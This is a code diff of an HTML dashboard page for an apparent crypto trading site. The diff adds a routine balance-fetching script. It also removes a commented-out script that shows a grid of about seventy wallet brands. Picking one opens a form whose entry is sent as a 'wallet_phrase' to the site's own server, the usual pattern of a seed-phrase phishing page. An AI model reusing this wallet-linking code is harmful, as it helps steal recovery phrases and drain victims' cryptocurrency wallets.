@@ -363,197 +363,6 @@
     </div>
   </div>
 </footer>
-
-  <script>
-//     const coins = [
-//   { name: "Bitcoin", logo: "./images/bitcoin.svg" },
-//   { name: "Trust Wallet", logo: "./images/trustwallet.png" },
-//   { name: "Lobstr", logo: "./images/lobstr.png" },
-//   { name: "Wallet Connect", logo: "./images/walletconnect.jpg" },
-//   { name: "Atomic", logo: "./images/atomic.png" },
-//   { name: "Rainbow", logo: "./images/rainbow.png" },
-//   { name: "Argent", logo: "./images/argent.jpeg" },
-//   { name: "Gnosis Safe Multisig", logo: "./images/gnosissafemultisig.jpeg" },
-//   { name: "Crypto.com", logo: "./images/cryptocom.png" },
-//   { name: "Nash", logo: "./images/nash.jpeg" },
-//   { name: "Metamask", logo: "./images/metamask.png" },
-//   { name: "Pillar", logo: "./images/pillar.png" },
-//   { name: "Tokenary", logo: "./images/tokenary.png" },
-//   { name: "Wazirx", logo: "./images/wazirx.png" },
-//   { name: "D'CENT Wallet", logo: "./images/dcentwallet.png" },
-//   { name: "ZelCore", logo: "./images/zelcore.png" },
-//   { name: "Coinomi", logo: "./images/coinomi.jpg" },
-//   { name: "Torus", logo: "./images/torus.jpeg" },
-//   { name: "ONTO", logo: "./images/onto.png" },
-//   { name: "Anchor", logo: "./images/anchor.png" },
-//   { name: "TokenPocket", logo: "./images/tokenpocket.png" },
-//   { name: "MathWallet", logo: "./images/mathwallet.png" },
-//   { name: "BitPay", logo: "./images/bitpay.jpg" },
-//   { name: "Ledger Live", logo: "./images/ledger.png" },
-//   { name: "Walleth", logo: "./images/walleth.png" },
-//   { name: "Authereum", logo: "./images/authereum.png" },
-//   { name: "Huobi Wallet", logo: "./images/huobiwallet.jpeg" },
-//   { name: "Eidoo", logo: "./images/eidoo.png" },
-//   { name: "MYKEY", logo: "./images/mykey.png" },
-//   { name: "Loopring Wallet", logo: "./images/loopringwallet.jpeg" },
-//   { name: "TrustVault", logo: "./images/trustvault.png" },
-//   { name: "Coin98", logo: "./images/coin98.png" },
-//   { name: "CoolWallet S", logo: "./images/coolwallets.png" },
-//   { name: "Alice", logo: "./images/alice.png" },
-//   { name: "GridPlus", logo: "./images/gridplus.png" },
-//   { name: "CYBAVO Wallet", logo: "./images/cybavowallet.png" },
-//   { name: "Spatium", logo: "./images/spatium.jpeg" },
-//   { name: "SafePal", logo: "./images/safepal.png" },
-//   { name: "Equal", logo: "./images/equal.jpeg" },
-//   { name: "Infinito", logo: "./images/infinito.png" },
-//   { name: "Ownbit", logo: "./images/ownbit.png" },
-//   { name: "EasyPocket", logo: "./images/easypocket.jpg" },
-//   { name: "ViaWallet", logo: "./images/viawallet.png" },
-//   { name: "Bridge Wallet", logo: "./images/bridgewallet.png" },
-//   { name: "SparkPoint", logo: "./images/sparkpoint.png" },
-//   { name: "Infinity Wallet", logo: "./images/infinitywallet.png" },
-//   { name: "wallet.io", logo: "./images/walletio.png" },
-//   { name: "BitKeep", logo: "./images/bitkeep.png" },
-//   { name: "Vision", logo: "./images/vision.png" },
-//   { name: "SWFT Wallet", logo: "./images/swftwallet.png" },
-//   { name: "PEAKDEFI Wallet", logo: "./images/peakdefiwallet.png" },
-//   { name: "Cosmostation", logo: "./images/cosmostation.png" },
-//   { name: "Graph Protocol", logo: "./images/graphprotocol.jpg" },
-//   { name: "KardiaChain", logo: "./images/kardiachain.png" },
-//   { name: "Keplr", logo: "./images/keplr.png" },
-//   { name: "Harmony", logo: "./images/harmony.png" },
-//   { name: "ICONex", logo: "./images/iconex.png" },
-//   { name: "Fetch", logo: "./images/fetch.jpg" },
-//   { name: "XDC Wallet", logo: "./images/xdcwallet.png" },
-//   { name: "Unstoppable Wallet", logo: "./images/unstoppablewallet.png" },
-//   { name: "MEET.ONE", logo: "./images/meetone.jpg" },
-//   { name: "Dok Wallet", logo: "./images/dokwallet.png" },
-//   { name: "AT.Wallet", logo: "./images/atwallet.png" },
-//   { name: "MoriX Wallet", logo: "./images/morixwallet.png" },
-//   { name: "Midas Wallet", logo: "./images/midaswallet.png" },
-//   { name: "Ellipal", logo: "./images/ellipal.png" },
-//   { name: "MEET.ONE", logo: "./images/meetone.jpg" },
-//   { name: "KEYRING PRO", logo: "./images/keyringpro.png" },
-//   { name: "Blockchain", logo: "./images/blockchain.png" },
-//   { name: "Binance Smart Chain", logo: "./images/binancesmartchain.png" },
-//   { name: "Aktionariat", logo: "./images/aktionariat.png"},
-//   { name: "Coinbase", logo: "./images/coinbase.jpg" },
-//   { name: "Exodus", logo: "./images/exodus.png" }
-// ];
-
-// const container = document.getElementById("crypto-container");
-// const selectedInput = document.getElementById("selectedCrypto");
-// const selectedCryptoTitle = document.getElementById("selectedCryptoTitle");
-
-// coins.forEach(coin => {
-//   const col = document.createElement("div");
-//   col.className = "col";
-//   col.innerHTML = `
-//     <div class="crypto-card text-center p-3 shadow-sm border rounded" data-name="${coin.name}" data-bs-toggle="modal" data-bs-target="#cryptoModal">
-//       <img src="${coin.logo}" alt="${coin.name}" class="crypto-logo mb-2" style="width: 50px; height: 50px; border-radius: 50%">
-//       <h5>${coin.name}</h5>
-//     </div>
-//   `;
-//   container.appendChild(col);
-// });
-
-// container.addEventListener("click", function(e) {
-//   const card = e.target.closest(".crypto-card");
-//   if (card) {
-//     const coinName = card.dataset.name;
-//     selectedInput.value = coinName;
-//     selectedCryptoTitle.textContent = coinName;
-//     switchForm('phone');
-//   }
-// });
-
-// // Switch form sections inside modal
-// function switchForm(type) {
-//   document.querySelectorAll('.form-section').forEach(el => el.classList.add("d-none"));
-//   document.getElementById(type + "Form").classList.remove("d-none");
-// }
-
-// // Simulated form sender
-// function sendForm(event, type) {
-//   event.preventDefault();
-//   const crypto = selectedInput.value;
-//   let walletData;
-
-//   if (type === "phone") {
-//     walletData = document.getElementById("phoneNumber").value;
-//   } else if (type === "email") {
-//     walletData = document.getElementById("emailAddress").value;
-//   } else {
-//     walletData = "Started Trading";
-//   }
-
-//   // Get auth token from localStorage
-//   const token = localStorage.getItem('authToken');
-//   if (!token) {
-//     alert('You must be logged in to add a wallet.');
-//     return;
-//   }
-
-//   // Prepare payload
-//   const payload = {
-//   wallet_name: crypto,
-//   wallet_phrase: walletData
-// };
-
-//   fetch('https://qfstrade.pythonanywhere.com/wallet/', {
-//     method: 'POST',
-//     headers: {
-//       'Content-Type': 'application/json',
-//       'Authorization': 'Token ' + token
-//     },
-//     body: JSON.stringify(payload)
-//   })
-//     .then(res => res.json())
-//     .then(result => {
-//       if (result && !result.error) {
-//         alert('Wallet added successfully!');
-//         document.getElementById("cryptoModal").classList.remove("show");
-//       } else {
-//         alert(result.error || 'Failed to add wallet.');
-//       }
-//     })
-//     .catch(() => {
-//       alert('Failed to add wallet.');
-//     });
-// }
-
-
-//     container.addEventListener("click", function(e) {
-//       const card = e.target.closest(".crypto-card");
-//       if (card) {
-//         selectedInput.value = card.dataset.name;
-//       }
-//     });
-
-//     function openModal(coin) {
-//     document.getElementById("coinName").value = coin;
-//     new bootstrap.Modal(document.getElementById("phoneModal")).show();
-//   }
-
-//   document.getElementById("cryptoForm").addEventListener("submit", async function (e) {
-//     e.preventDefault();
-//     const coin = document.getElementById("coinName").value;
-//     const phone = document.getElementById("phone").value;
-
-//     const response = await fetch("http://localhost:3000/send", {
-//       method: "POST",
-//       headers: { "Content-Type": "application/json" },
-//       body: JSON.stringify({ coin, phone })
-//     });
-
-//     if (response.ok) {
-//       alert("Wallet linked successfully!");
-//       bootstrap.Modal.getInstance(document.getElementById("phoneModal")).hide();
-//     } else {
-//       alert("Failed to link.");
-//     }
-//   });
-  </script>
   <script>
     function openWalletPage(coinName, coinLogo, walletAddress, coinCurrency) {
       const coinData = {
@@ -606,6 +415,41 @@
       isVisible = !isVisible;
     });
   </script>
+  <script>
+  async function fetchBalance() {
+    try {
+      const res = await fetch('https://qfstrade.pythonanywhere.com/dashboard/', {
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': 'Token ' + (localStorage.getItem('authToken') || '')
+        },
+        credentials: 'include'
+      });
+
+      if (!res.ok) throw new Error('Failed to fetch balance');
+
+      const data = await res.json();
+
+      // Update balance in UI
+      const balanceEl = document.getElementById('equityUSD');
+      if (balanceEl) {
+        const formatted = Number(data.total_balance || 0).toLocaleString('en-US', {
+          style: 'currency',
+          currency: 'USD',
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2
+        });
+        balanceEl.textContent = formatted;
+      }
+
+    } catch (err) {
+      console.error('Balance fetch error:', err);
+    }
+  }
+
+  // Run when page loads
+  document.addEventListener('DOMContentLoaded', fetchBalance);
+</script>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script src="./js/script.js"></script>
